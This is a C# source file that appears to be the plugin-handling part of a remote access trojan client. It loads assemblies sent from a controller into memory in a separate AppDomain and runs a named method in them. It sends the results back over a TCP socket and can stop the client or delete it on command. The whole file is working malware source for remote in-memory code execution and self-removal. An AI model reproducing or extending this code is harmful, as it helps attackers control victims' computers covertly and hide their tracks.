using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Security.Policy;
using System.Text;
using MessagePack;
using Microsoft.CSharp;

namespace Client.HandlePacket
{
    internal class HandlePlugin
    {

        public static List<AppDomain> appDomains = new List<AppDomain>();

        public static void PluginLoad(string appdomainName, byte[] assemblyBytes)
        {
            PluginUnload(appdomainName);

            if (Program.ClrVersion == 4)
            {
                assemblyBytes = ReplaceBytes(assemblyBytes, Encoding.UTF8.GetBytes("v2.0.50727"), Encoding.UTF8.GetBytes("v4.0.30319"));
            }

            var appDomain = loadAppDomainModule("pluginMain", appdomainName, assemblyBytes);
            if (appDomain != null) appDomains.Add(appDomain);
        }

        public static void PluginUnload(string appdomainName)
        {
            foreach (var item in appDomains)
                if (item.FriendlyName == appdomainName)
                    AppDomain.Unload(item);
        }


        public class ShadowRunner : MarshalByRefObject
        {
            public string[] LoadAssembly(byte[] assembly, string[] args, string sMethod)
            {
                var asm = Assembly.Load(assembly);
                var test = new string[] { };
                foreach (var type in asm.GetTypes())
                    foreach (var method in type.GetMethods())
                        if (method.Name.ToLower().Equals(sMethod.ToLower()))
                            test = (string[])method.Invoke(null, new object[] { args });
                return test;
            }
        }

        public static AppDomain loadAppDomainModule(string sMethod, string sAppDomain, byte[] bMod)
        {
            var oDomain = AppDomain.CreateDomain(sAppDomain, null, null, null, false);
            var runner = (ShadowRunner)oDomain.CreateInstanceAndUnwrap(typeof(ShadowRunner).Assembly.FullName,
                typeof(ShadowRunner).FullName);
            var result = runner.LoadAssembly(bMod, new[] { Program.Mutex }, sMethod);
            if (result == null) return null;
            switch (result[0])
            {
                case "Null":
                    {
                        AppDomain.Unload(oDomain);
                        return null;
                    }

                case "Stop":
                    {
                        AppDomain.Unload(oDomain);
                        HandleOption.Stop();
                        return null;
                    }

                case "Delete":
                    {
                        AppDomain.Unload(oDomain);
                        HandleOption.DeleteSelf();
                        HandleOption.Stop();
                        return null;
                    }

                default:
                    {
                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = result[0];
                        msgpack.ForcePathObject("Message").AsString = result[1];
                        Program.TCP_Socket.Send(msgpack.Encode2Bytes());
                        AppDomain.Unload(oDomain);
                        return null;
                    }
            }
        }

        public static byte[] ReplaceBytes(byte[] src, byte[] search, byte[] repl)
        {
            if (repl == null) return src;
            int index = FindBytes(src, search);
            if (index < 0) return src;
            byte[] dst = new byte[src.Length - search.Length + repl.Length];
            Buffer.BlockCopy(src, 0, dst, 0, index);
            Buffer.BlockCopy(repl, 0, dst, index, repl.Length);
            Buffer.BlockCopy(src, index + search.Length, dst, index + repl.Length, src.Length - (index + search.Length));
            return dst;
        }

        public static int FindBytes(byte[] src, byte[] find)
        {
            if (src == null || find == null || src.Length == 0 || find.Length == 0 || find.Length > src.Length) return -1;
            for (int i = 0; i < src.Length - find.Length + 1; i++)
            {
                if (src[i] == find[0])
                {
                    for (int m = 1; m < find.Length; m++)
                    {
                        if (src[i + m] != find[m]) break;
                        if (m == find.Length - 1) return i;
                    }
                }
            }
            return -1;
        }
    }
}